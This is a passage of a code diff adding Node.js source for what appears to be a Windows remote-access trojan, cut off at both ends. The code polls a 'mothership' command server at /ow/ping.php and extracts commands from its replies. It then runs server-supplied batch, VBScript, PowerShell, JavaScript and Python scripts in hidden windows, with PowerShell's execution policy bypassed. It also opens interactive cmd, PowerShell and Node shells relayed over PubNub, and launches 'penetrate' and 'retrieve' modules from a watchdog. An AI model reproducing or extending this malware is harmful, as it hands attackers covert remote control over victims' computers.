+    } catch (err) {
+        logmsg(err);
+    }
+
+    if (outproclist && outproclist.length > 0) {
+        return outproclist;
+    }
+}
+
+async function getProcess(pid) {
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let processlist = await initProcessList();
+
+    if (!processlist || processlist.length >= 1) {
+        return null;
+    }
+
+    for (let i = 0; i < processlist.length; i++) {
+        if (processlist[i].ProcessId == pid) return processlist[i];
+    }
+
+    return null;
+}
+
+function setcwd(localpath) {
+    logmsg(`Starting directory: ${process.cwd()}`);
+
+    process.chdir(localpath);
+
+    logmsg(`New directory: ${process.cwd()}`);
+}
+
+function getRandomCode(n) {
+    const min = Math.pow(10, n - 1);
+    const max = Math.pow(10, n) - 1;
+
+    return crypto.randomInt(min, max + 1).toString();
+}
+
+function isNullOrWhitespace(str) {
+    if (typeof str === "undefined" || str === null ) {
+        return true;
+    }
+
+    if (!(typeof str === "string")) return true;
+
+    return !str || !str.trim();
+}
+
+function getCallerName() {
+    const originalFunc = Error.prepareStackTrace;
+
+    try {
+        Error.prepareStackTrace = (err, stack) => stack;
+
+        const err = new Error();
+        const currentStack = err.stack;
+
+        if (currentStack && currentStack[2]) {
+            return currentStack[2].getFunctionName() || "SYSTEM";
+        }
+    } catch (e) {
+    } finally {
+        Error.prepareStackTrace = originalFunc;
+    }
+
+    return "unknown";
+}
+
+function logmsg(msgstr) {
+    let callername = getCallerName();
+    let msgout =
+        "|" +
+        String(systemstate?.cmdname ?? "UNKNOWN") +
+        "|" +
+        String(systemstate?.scriptpid ?? "-1") +
+        "|" +
+        callername;
+
+    if (msgstr instanceof Error) {
+        msgout += "|" + util.inspect(msgstr);
+    } else if (typeof msgstr === "string") {
+        msgout += "|" + msgstr;
+    }
+
+    console.log(msgout);
+
+    if (systemstate)
+        fs.appendFileSync(systemstate.logfpath, msgout + "\r\n", "utf8");
+}
+
+function getTimestamp() {
+    const date = new Date();
+
+    // Extract components
+    const year = date.getFullYear();
+    const month = String(date.getMonth() + 1).padStart(2, "0"); //
+    const day = String(date.getDate()).padStart(2, "0"); //
+    const hours = String(date.getHours()).padStart(2, "0"); //
+    const minutes = String(date.getMinutes()).padStart(2, "0"); //
+    const seconds = String(date.getSeconds()).padStart(2, "0"); //
+    const ms = String(date.getMilliseconds()).padStart(3, "0"); //
+
+    // Combine into final strings
+    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
+    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+
+    return fullWithMs;
+}
+
+function isValidDict(objin) {
+    return (
+        typeof objin === "object" &&
+        objin !== null &&
+        Object.keys(objin).length > 0
+    );
+}
+
+function isValidHttpUrl(string) {
+    try {
+        const url = new URL(string);
+        return url.protocol === "http:" || url.protocol === "https:";
+    } catch (error) {
+        return false;
+    }
+}
+
+async function makePUTRequest(baseUrl, params, inputHeaders, filepath) {
+    logmsg("starting");
+
+    const fileBlob = await fs.openAsBlob(filepath);
+
+    inputHeaders = inputHeaders ?? {};
+    inputHeaders["Content-Type"] = "application/octet-stream";
+
+    const url = new URL(baseUrl);
+
+    logmsg(`baseUrl: ${baseUrl} filepath: ${filepath}`);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
+        });
+    }
+
+    logmsg("request url: " + url.toString());
+
+    const request = new Request(url.toString(), {
+        method: "PUT",
+        body: fileBlob,
+        headers: inputHeaders,
+        duplex: "half",
+    });
+
+    const response = await fetch(request);
+
+    request.headers.forEach((value, key) => {
+        logmsg(`${key}: ${value}`);
+    });
+
+    const textData = await response.text();
+
+    let headersOut = {};
+
+    for (const [key, value] of response.headers.entries()) {
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut,
+        responseText: textData,
+    };
+
+    logmsg("response status=" + response.status);
+
+    return responseOut;
+}
+
+/*
+    status: response.status,
+    statusText: response.statusText,
+    headers: headersOut,
+    downloadOpts : {
+        download: true,
+        filetype: "txt",
+        localpath: outputPath
+    }
+*/
+async function makeGetRequest(
+    baseUrl,
+    params,
+    inputHeaders,
+    downloadOpts = null
+) {
+    logmsg("starting");
+
+    if (isNullOrWhitespace(baseUrl)) {
+        throw new Error("baseUrl is empty");
+    } else if (!isValidHttpUrl(baseUrl)) {
+        throw new Error("baseUrl is invalid [" + baseUrl + "]");
+    }
+
+    const url = new URL(baseUrl);
+
+    logmsg("baseUrl: " + baseUrl);
+
+    if (isValidDict(params)) {
+        Object.keys(params).forEach((key) => {
+            url.searchParams.append(key, params[key]);
+        });
+    }
+
+    logmsg("url=" + url.toString());
+
+    if (!isValidDict(downloadOpts)) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
+
+        downloadOpts = {
+            download: true,
+            filetype: "txt",
+            localpath: outputPath,
+        };
+    }
+
+    const tinputHeaders = {
+        Accept: "*/*",
+        "User-Agent": "NodeJS-Fetch-Client",
+    };
+
+    if (isValidDict(inputHeaders)) {
+        Object.assign(tinputHeaders, inputHeaders);
+    }
+
+    let response = null;
+
+    logmsg("executing GET request");
+
+    response = await fetch(url.toString(), {
+        method: "GET",
+        headers: tinputHeaders,
+    });
+
+    if (!response.ok) {
+        throw new Error(`HTTP error -- Status: ${response.status}`);
+    }
+
+    let headersOut = {};
+
+    for (const [key, value] of response.headers.entries()) {
+        if (!isNullOrWhitespace(key) && !isNullOrWhitespace(value)) {
+            logmsg("response headers key=" + key + " value=" + value);
+            headersOut[key] = value;
+        }
+    }
+
+    let responseOut = {
+        status: response.status,
+        statusText: response.statusText,
+        headers: headersOut,
+        // downloadOpts
+    };
+
+    logmsg("response status=" + response.status);
+
+    if (!isValidDict(downloadOpts) || !downloadOpts.download) {
+        return responseOut;
+    }
+
+    if (
+        !Object.hasOwn(downloadOpts, "localpath") ||
+        isNullOrWhitespace(downloadOpts.localpath)
+    ) {
+        let outputPath = path.join(
+            systemstate.trojandir,
+            "download_" + getRandomCode(8)
+        );
+
+        downloadOpts.localpath = outputPath;
+    }
+
+    if (
+        !Object.hasOwn(downloadOpts, "filetype") ||
+        isNullOrWhitespace(downloadOpts.filetype)
+    ) {
+        downloadOpts.filetype = "txt";
+    }
+
+    if (downloadOpts.filetype == "txt") {
+        let rawText = await response.text();
+        fs.writeFileSync(downloadOpts.localpath, rawText, "utf8");
+        responseOut.rawText = rawText;
+    } else {
+        const arrayBuffer = await response.arrayBuffer();
+        // const buffer = Buffer.from(arrayBuffer);
+        const bufferView = new Uint8Array(arrayBuffer);
+        fs.writeFileSync(downloadOpts.localpath, bufferView);
+        responseOut.buffer = arrayBuffer;
+    }
+
+    responseOut.downloadOpts = downloadOpts;
+
+    logmsg("finished");
+
+    return responseOut;
+}
+/*
+responseOut = {
+    downloadOpts { filetype, localpath }
+    rawText
+    buffer
+    status
+    statusText
+    headers
+}
+*/
+
+function folderExists(folderPath) {
+    try {
+        const stats = fs.statSync(folderPath);
+        return stats.isDirectory();
+    } catch (error) {
+        return false;
+    }
+}
+
+function fileExists(filePath) {
+    try {
+        const stats = fs.statSync(filePath);
+        return stats.isFile();
+    } catch (error) {
+        return false;
+    }
+}
+
+function readTag(fpath) {
+    logmsg("reading " + fpath);
+
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist [" + fpath + "]");
+    }
+
+    const fileContent = fs.readFileSync(fpath, "utf-8");
+
+    const lines = fileContent.split(/\r?\n/);
+
+    if (Array.isArray(lines) && lines.length > 0) {
+        const firstLineTrimmed = lines[0].trim();
+
+        logmsg(firstLineTrimmed);
+
+        return firstLineTrimmed;
+    }
+
+    throw new Error("not able to read file [" + fpath + "]");
+}
+
+function writeTag(fpath, tagstr) {
+    logmsg(`writing to ${fpath}`);
+    fs.writeFileSync(fpath, tagstr, "utf8");
+}
+
+function isPidAlive(pid) {
+    if (pid <= 0) {
+        return false;
+    }
+
+    try {
+        // Signal 0 tests for process existence without modifying it
+        process.kill(pid, 0);
+        return true;
+    } catch (error) {
+        // ESRCH means the process was not found
+        return error.code === "EPERM"; // True if it exists but you lack permissions
+    }
+}
+
+function isAsyncFunction(fn) {
+    return fn?.constructor?.name === "AsyncFunction";
+}
+
+function extractText(rawtext, begintoken, endtoken) {
+    let token_start = rawtext.indexOf(begintoken);
+    let token_end = rawtext.indexOf(endtoken);
+    let cmdstr = "";
+
+    if (token_start >= 0 && token_end > token_start) {
+        cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
+    }
+
+    return cmdstr;
+}
+
+function keyExists(obj, prop) {
+    return Object.keys(obj).some(
+        (key) => key.toLowerCase() === prop.toLowerCase()
+    );
+}
+
+function getKey(obj, searchKey) {
+    let keyret = Object.keys(obj).find(
+        (key) => key.toLowerCase() === searchKey.toLowerCase()
+    );
+
+    return keyret;
+}
+
+// --- startup
+
+(async () => {
+    systemstate.usersid = await getusersid();
+
+    if (isNullOrWhitespace(systemstate.usersid)) {
+        systemstate.usersid = await getusersid_whoami();
+    }
+})();
+
+let cmdarr = process_argv;
+let cmdarrstr = cmdarr ? cmdarr.join() : "";
+
+logmsg(
+    `starting -- cmdname=${systemstate.cmdname} cmdtaskname=${systemstate.cmdtaskname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`
+);
+logmsg(`scriptmd5=${systemstate.scriptmd5}`);
+
+ensureSingleInstancePipe(systemstate.cmdconfig.cmdfunc);
+
+// --- IPC for current running process: message send/receive
+
+// message handler -- overriden by child cmds (ping, cmdlist)
+var handleMessage = function (msg) {
+    logmsg("pass");
+};
+
+// receives messages from parent process -- should be used by cmdlist, ping, relay
+process.on("message", (message) => {
+    if (!message) {
+        throw new Error("null message");
+    }
+
+    logmsg(`[XAW]incomming message:` + JSON.stringify(message));
+
+    if (handleMessage) {
+        logmsg("handleMessage begin");
+        handleMessage(message);
+        logmsg("handleMessage end");
+    }
+});
+
+// sends message to parent process -- should be called by cmdlist, ping, relay
+async function sendMessage(dest, msgpayload) {
+    let isvalid = typeof process.send === "function" && process.connected;
+    const parentPid = process.ppid;
+
+    if (!isvalid) {
+        throw new Error(
+            "this process does not have a parent process to communicate with"
+        );
+        return;
+    }
+
+    logmsg("[CHILD] sending message to parent pid=" + parentPid);
+
+    let message = {
+        senderPid: process.pid,
+        src: systemstate.cmdname,
+        dest: dest,
+        payload: msgpayload,
+        ts: getTimestamp(),
+    };
+
+    return new Promise((resolve, reject) => {
+        process.send(message, undefined, undefined, (error) => {
+            if (error) return reject(error);
+
+            resolve();
+        });
+    });
+}
+
+// ---
+
+function watchdog() {
+    logmsg("starting");
+
+    let watchdogcmd = systemstate.cmdconfig;
+
+    let penetratecmd = new CmdConfig("penetrate");
+    let retrievecmd = new CmdConfig("retrieve");
+
+    retrievecmd.launch(null, true);
+    penetratecmd.launch(null, true);
+
+    watchdogcmd.newCmdConfig("ping");
+    watchdogcmd.newCmdConfig("cmdlist");
+
+    let childcmds = watchdogcmd.childcmds;
+
+    watchdogcmd.loopfunc = () => {
+        for (let i = 0; i < childcmds.length; i++) {
+            let childcmd = childcmds[i];
+
+            childcmd.activate();
+        }
+    };
+
+    watchdogcmd.loop();
+
+    logmsg("finished");
+}
+
+function validatePingResponse(pingresponse) {
+    let downloadOpts = pingresponse.downloadOpts;
+
+    if (!fileExists(downloadOpts.localpath)) {
+        return false;
+    }
+
+    if (!downloadOpts.filetype == "txt") {
+        return false;
+    }
+
+    let rawtext = pingresponse.rawText;
+
+    if (isNullOrWhitespace(rawtext)) return false;
+
+    let tokens = ["CLIENT_EXISTS", "CLIENT_EXISTS_NEW_PROFILE", "NEW_CLIENT"];
+
+    for (let i = 0; i < tokens.length; i++) {
+        if (rawtext.includes(tokens[i])) {
+            logmsg("ping reponse contains: " + tokens[i]);
+            return true;
+        }
+    }
+
+    logmsg("ping reponse is not valid");
+
+    return false;
+}
+
+function processClientJob(rawtext) {
+    let clientjob = null;
+
+    if (rawtext.includes("execute_cmdlist")) {
+        clientjob = {
+            jobtype: "execute_cmdlist",
+            jobcode: "",
+        };
+
+        return clientjob;
+    }
+
+    let jobcode = extractText(rawtext, "JOBCODE_BEGIN", "JOBCODE_END");
+
+    let begintoken = "EXEC_CMD_BEGIN";
+    let endtoken = "EXEC_CMD_END";
+    let cmdstr = extractText(rawtext, begintoken, endtoken);
+
+    if (!isNullOrWhitespace(cmdstr)) {
+        let parts = cmdstr.split("|");
+        parts = parts.filter((item) => !isNullOrWhitespace(item));
+
+        if (parts.length >= 1) {
+            let clientjob = {
+                jobtype: "EXEC_CMD",
+                jobcode: jobcode,
+                cmdname: parts[0],
+                args: parts.length > 1 ? parts.slice(1) : [],
+            };
+
+            return clientjob;
+        } else {
+            throw new Error("client job request is malformed");
+        }
+    }
+
+    let tokens = ["BAT", "VBS", "PS1", "JS", "PY"];
+
+    for (let i = 0; i < tokens.length; i++) {
+        let token = tokens[i];
+
+        let scripttext = extractText(
+            rawtext,
+            "EXEC_" + token + "_BEGIN",
+            "EXEC_" + token + "_END"
+        );
+
+        if (!isNullOrWhitespace(scripttext)) {
+            let fpath = systemstate.getClientJobPath();
+            fs.writeFileSync(fpath, scripttext, "utf8");
+
+            if (!fileExists(fpath)) {
+                throw new Error("unable to write script text to file " + fpath);
+            }
+
+            let clientjob = {
+                jobtype: "EXEC_" + token,
+                jobcode: jobcode,
+                //scripttext: scripttext
+                localpath: fpath,
+            };
+
+            return clientjob;
+        }
+    }
+
+    return null;
+}
+
+async function ping_loop() {
+    let baseUrl = systemstate.mothership + "/ow/ping.php"; // TODO move over to systemstate
+
+    let inputHeaders = null;
+    let params = systemstate.statekvp;
+
+    let pingpath = path.join(systemstate.trojandir, "ping_response");
+    let downloadOpts = { download: true, filetype: "txt", localpath: pingpath };
+    let pingresponse = await makeGetRequest(
+        baseUrl,
+        params,
+        inputHeaders,
+        downloadOpts
+    );
+
+    let isvalid = validatePingResponse(pingresponse);
+
+    if (!isvalid) {
+        logmsg("ping response is invalid");
+        systemstate.selectMothership();
+        return;
+    }
+
+    let rawtext = pingresponse.rawText;
+
+    let clientjob = processClientJob(rawtext);
+
+    if (clientjob) {
+        logmsg(
+            `sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`
+        );
+        await sendMessage("cmdlist", clientjob);
+    }
+}
+
+function ping_handleMessage(msg) {
+    logmsg("pass");
+}
+
+function ping() {
+    logmsg("starting");
+
+    let cmdconfig = systemstate.cmdconfig;
+    handleMessage = ping_handleMessage;
+
+    cmdconfig.loopfunc = ping_loop;
+
+    cmdconfig.loop();
+
+    logmsg("finished");
+}
+
+function execPSScript_async(
+    scriptfpath,
+    cmdlineargsarr,
+    execopts
+) {
+
+    return new Promise((resolve) => {
+        let childp = null;
+        childp = execPSScript(scriptfpath,cmdlineargsarr,execopts,null,null, (code)=>{
+            logmsg(`child process exited with code ${code}`);
+            resolve(childp);
+        });
+    });
+}
+
+function execPSScript(
+    scriptfpath,
+    cmdlineargsarr,
+    execopts,
+    stdoutfunc,
+    stderrfunc,
+    closefunc
+) {
+    logmsg("starting");
+
+    cmdlineargsarr = cmdlineargsarr || [];
+    cmdlineargsarr = [
+        "-WindowStyle",
+        "Hidden",
+        "-NoProfile",
+        "-ExecutionPolicy",
+        "Bypass",
+        "-File",
+        scriptfpath,
+        ...cmdlineargsarr,
+    ];
+
+    let cwd = path.dirname(scriptfpath);
+
+    if (!execopts) {
+        execopts = { cwd: cwd };
+    }
+
+    let child = spawn("powershell.exe", cmdlineargsarr, execopts);
+
+    child.stdout.on("data", (data) => {
+        let text = data.toString();
+
+        if (stdoutfunc) stdoutfunc(text);
+        else logmsg(text);
+    });
+
+    child.stderr.on("data", (data) => {
+        let text = data.toString();
+
+        if (stderrfunc) stderrfunc(text);
+        else logmsg(text);
+    });
+
+    child.on("close", (code) => {
+        if (closefunc) closefunc(code);
+        else logmsg(`[J8R3] child process exited with code ${code}`);
+    });
+
+    child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+
+    logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);
+
+    return child;
+}
+
+function execVBSScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "VBS";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn(
+        "cscript",
+        ["//E:vbscript", "//B", "//nologo", scriptfpath, ...cmdlineargsarr],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            // shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+
+    logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execNODEScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "NODE";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn("node", [scriptfpath, ...(cmdlineargsarr ?? [])], {
+        // detached: true, // might cause errors
+        windowsHide: true,
+        shell: false,
+        cwd: systemstate.trojandir,
+    });
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+
+    logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execPYTHONScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let enginename = "PYTHON";
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        `exec${enginename}script_${tmpcode}.out`
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        `spawning process: ${scriptfpath} cmdlineargsarr: ${cmdlineargsarr.join()}`
+    );
+
+    const child = spawn(
+        "python",
+        ["-u", scriptfpath, ...(cmdlineargsarr ?? [])],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
+
+    child.stdout.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(out, str);
+
+        logmsg(`STDOUT: ${data.toString()}`);
+
+        // TODO: log to mothership
+    });
+
+    child.stderr.on("data", (data) => {
+        let str = Buffer.from(data).toString("utf-8");
+        fs.writeSync(err, str);
+
+        logmsg(`STDERR: ${str}`);
+
+        // TODO: log to mothership
+    });
+
+    child.on("close", (code) => {
+        logmsg(`Process complete. Exit code: ${code}`);
+
+        // TODO: log to mothership
+    });
+
+    child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    let spawnargsstr = JSON.stringify(child.spawnargs);
+    let childpidstr = child.pid;
+
+    logmsg(`launched child pid=${childpidstr} spawn args: ${spawnargsstr}`);
+
+    logmsg("finished");
+
+    return child;
+}
+
+function execCMDScript(scriptfpath, cmdlineargsarr) {
+    logmsg("starting");
+
+    let tmpcode = getRandomCode(8);
+
+    let stdoutfpath = path.join(
+        systemstate.trojandir,
+        "execCMDScript_" + tmpcode + ".out"
+    );
+    let stderrfpath = path.join(
+        systemstate.trojandir,
+        "execCMDScript_" + tmpcode + ".err"
+    );
+
+    const out = fs.openSync(stdoutfpath, "a");
+    const err = fs.openSync(stderrfpath, "a");
+
+    cmdlineargsarr = cmdlineargsarr ?? [];
+
+    logmsg(
+        "spawning process: " +
+        scriptfpath +
+        " cmdlineargsarr: " +
+        cmdlineargsarr.join()
+    );
+
+    const child = spawn(
+        "cmd.exe",
+        ["/c", scriptfpath, ...(cmdlineargsarr ?? [])],
+        {
+            // detached: true, // might cause errors
+            windowsHide: true,
+            stdio: ["ignore", out, err],
+            shell: false,
+            cwd: systemstate.trojandir,
+        }
+    );
+
+    child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+        JSON.stringify(child.spawnargs)
+    );
+
+    logmsg("finished");
+
+    return child;
+}
+
+function writeToChildProcess(child, msg) {
+    if (!child) {
+        throw new Error("child process is null");
+    }
+
+    if (child.stdin.writable) {
+        logmsg(`writing msg to child process: ${child.pid} -- ` + msg);
+        child.stdin.write(msg);
+        // child.stdin.end();
+    }
+}
+
+function runpythonrelay(browser = "chrome") {
+    let configfpath = path.join(
+        systemstate.trojandir,
+        "pythonrelay.py_" + getRandomCode(8) + "_config.json"
+    );
+
+    let jsontext = JSON.stringify({
+        browser: browser || "chrome",
+        batchid: getRandomCode(8), // TODO why is batchid needed here?
+    });
+
+    fs.writeFileSync(configfpath, jsontext);
+
+    // TODO check if python is installed, working
+
+    return execPYTHONScript(
+        path.join(systemstate.trojandir, "pythonrelay.py"),
+        [configfpath]
+    );
+}
+
+function runpsrelay(pubnubo) {
+    const child = spawn("powershell.exe", ["-NoProfile", "-Command", "-"], {
+        shell: false,
+        // detached: true, // causes problems
+        windowsHide: true,
+        cwd: "",
+    });
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    child.stdout.on("data", (data) => {
+        const str = Buffer.from(data).toString();
+
+        logmsg(`STDOUT: ${str}`);
+
+        pubnubo.publishMessage({
+            execresult: str,
+            ts: getTimestamp(),
+            responseid: getRandomCode(8),
+        });
+    });
+
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
+    });
+
+    child.stderr.on("data", (data) => {
+        const str = Buffer.from(data).toString();
+
+        logmsg(`STDERR: ${str}`);
+
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
+    });
+
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+        } else {
+            logmsg("Unexpected STDIN error:", err);
+        }
+    });
+
+    child.on("close", (code) => {
+        logmsg(`script engine exited with code ${code}`);
+    });
+
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
+    });
+
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+        JSON.stringify(child.spawnargs)
+    );
+
+    // log event to mothership
+    // TODO log to pubnub
+
+    logmsg("finished");
+
+    return child;
+}
+
+function runnoderelay(pubnubo) {
+    logmsg("starting");
+
+    const child = spawn(systemstate.nodeexepath, ["-i"], {
+        shell: false,
+        detached: true,
+        windowsHide: true,
+        cwd: "",
+    });
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    // [CADZ248S]: child.stdin.on --> wired up within relay() func
+    // lookup [7SZOSMSP]
+
+    child.stdout.on("data", (data) => {
+        const str = Buffer.from(data).toString();
+
+        logmsg(`[5LKC] Output: ${str}`);
+
+        pubnubo.publishMessage({
+            execresult: str,
+            ts: getTimestamp(),
+            responseid: getRandomCode(8),
+        });
+    });
+
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
+    });
+
+    child.stderr.on("data", (data) => {
+        const str = Buffer.from(data).toString();
+
+        logmsg(`stderr: ${str}`);
+
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
+    });
+
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+        } else {
+            logmsg("Unexpected STDIN error:", err);
+        }
+    });
+
+    child.on("close", (code) => {
+        logmsg(`script engine exited with code ${code}`);
+    });
+
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
+    });
+
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+        JSON.stringify(child.spawnargs)
+    );
+
+    // log event to mothership
+    // TODO log to pubnub
+
+    logmsg("finished");
+
+    return child;
+}
+
+function runbatrelay(pubnubo) {
+    logmsg("starting");
+
+    const child = spawn("cmd.exe", [], {
+        detached: true,
+        windowsHide: true,
+        stdio: ["pipe", "pipe", "pipe"],
+        shell: false,
+        cwd: systemstate.trojandir,
+    });
+
+    // child.unref();
+
+    // CommandLine
+    // Name
+    // ProcessId
+
+    child.stdout.on("data", (data) => {
+        logmsg(`Output: ${data}`);
+
+        const str = Buffer.from(data).toString();
+
+        pubnubo.publishMessage({ execresult: str, ts: getTimestamp() });
+    });
+
+    child.stdout.on("error", (err) => {
+        logmsg("STDOUT error:", err);
+    });
+
+    child.stderr.on("data", (data) => {
+        logmsg(`Output: ${data}`);
+        // TODO log to pubnub
+    });
+
+    child.stdin.on("error", (err) => {
+        if (err.code === "EPIPE") {
+            logmsg("Subprocess closed stdin early; ignoring broken pipe.");
+        } else {
+            logmsg("Unexpected STDIN error:", err);
+        }
+    });
+
+    child.on("close", (code) => {
+        logmsg(`script engine exited with code ${code}`);
+        // TODO log to pubnub
+    });
+
+    child.on("error", (err) => {
+        logmsg("Failed to start subprocess:", err);
+    });
+
+    logmsg(
+        `launched child pid=${child.pid} spawn args: ` +
+        JSON.stringify(child.spawnargs)
+    );
+
+    // log event to mothership
+    // TODO log to pubnub
+
+    logmsg("finished");
+
+    return child;
+}
+
+function launchrelay(tenginename, tpubnubr, browsername) {
+    logmsg(`launching: ${tenginename} -- browsername=${browsername}`);
+
+    if (tenginename == "JS") {
+        tchildp = runnoderelay(tpubnubr);
+    } else if (tenginename == "BAT") {
+        tchildp = runbatrelay(tpubnubr);
+    } else if (tenginename == "PS1") {
+        tchildp = runpsrelay(tpubnubr);
+    } else if (tenginename == "PY") {
+        tchildp = runpythonrelay(browsername);
+    } else if (tenginename == "VBS") {
+        throw new Error("VBS relay is not supported");
+    }
+
+    return tchildp;
+}
+
+function relay() {
+    logmsg("starting");
+
+    let relaycmd = systemstate.cmdconfig;
+
+    let clientjob = relaycmd.clientjob;
+
+    if (clientjob == null) {
+        logmsg("cannot start relay without client job");
+        process.exit(1);
+    }
+
+    let args = clientjob.args || [];
+
+    if (args.length == 0) {
+        throw new Error(
+            "cannot start relay as clientjob does not specify args"
+        );
+    }
+
+    let enginename = args[0];
+    enginename = enginename.toUpperCase();
+
+    if (isNullOrWhitespace(enginename)) {
+        throw new Error("enginename is missing");
+    }
+
+    if (!["PY", "JS", "BAT", "PS1"].includes(enginename)) {
+        throw new Error(`engine is not supported: ${enginename}`);
+    }
+
+    let browsername = "";
+
+    if (enginename == "PY") {
+        if (args.length <= 0) {
+            browsername = "chrome";
+            logmsg(`defaulting to browsername=${browsername}`);
+        } else {
+            browsername = args[1];
+            logmsg(`browsername=${browsername}`);
+        }
+    }
+
+    let pubnubr = null;
+
+    // note: python relay uses its own pubnub logic within the python script (pythonrelay.py)
+
+    // [7SZOSMSP]: wire up stdin of childp to incomming pubnub messages
+    // lookup [CADZ248S] for the childp stdout handlers
+    if (enginename != "PY") {
+        relaycmd.pubnubrelay = new PubnubRelay(enginename);
+
+        pubnubr = relaycmd.pubnubrelay;
+
+        // handle incoming message from pubnub (cmds sent by host to client)
+        pubnubr.handleMessage = (msgevent) => {
+            let payload = msgevent.message;
+            let cmdtext = payload.cmdtext;
+            writeToChildProcess(childp, cmdtext);
+        };
+    }
+
+    let childp = null;
+
+    relaycmd.loopfunc = () => {
+        logmsg("relay looping...");
+
+            pubnubr.publishMessage({
+                ping: 'ping '+getRandomCode(8),
+                ts: getTimestamp()
+            });
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if (!isPidAlive(tcmdpid)) {
